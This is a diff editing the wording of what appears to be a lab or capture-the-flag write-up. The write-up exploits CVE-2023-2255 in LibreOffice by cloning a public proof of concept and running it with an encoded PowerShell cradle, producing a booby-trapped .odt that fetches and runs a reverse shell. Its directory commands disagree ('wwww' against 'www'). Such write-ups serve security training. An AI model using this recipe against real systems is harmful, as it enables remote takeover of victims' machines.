@@ -276,7 +276,7 @@ This is very usefull now. Basically the script checks all .odt files inside \Imp
 We can see that LibreOffice is installed, the .ini file is located inside the programs directory:
 <img width="1917" height="252" alt="image" src="https://github.com/user-attachments/assets/20f55c6a-7dbb-4b36-9dee-32528c73692d" />
 
-Version for LibreOffice is 7.4.0.1 if we look online we'll find the following CVE: CVE-2023-2255. basically this creates a malicious file that when executed with libreoffice'll execute a command of our choosing. The plan now is to use the PoC to craft a malicious .odt file that forces the machine to execute a reverse shell back to us. First we clone the repository:
+Version for LibreOffice is 7.4.0.1 if we look online we'll find the following CVE: CVE-2023-2255. Basically this creates a malicious file that will execute a command of our choosing. The plan now is to use the PoC to craft a malicious .odt file that forces the machine to execute a reverse shell back to us. First we clone the repository:
 ```bash
 git clone https://github.com/elweth-sec/CVE-2023-2255.git
 ```
@@ -292,8 +292,8 @@ Next, copy and execute this command:
 ```bash
 python CVE-2023-2255.py --cmd 'cmd /c powershell -enc <your-cradle>' --output exploit.odt
 ```
-Practically, what that does is create a malicious .odt file that contains instructions, so that a reverse shell is downloaded unto the target machine and executed.
-Next create a wwww directory and move it into CVE-2023-2255 directory:
+Here the malicious .odt file is created. It contains instructions so that a reverse shell is downloaded unto the target machine and executed.
+Next create a 'wwww' directory and move it into CVE-2023-2255 directory:
 ```bash
 mkdir wwww
 cd www
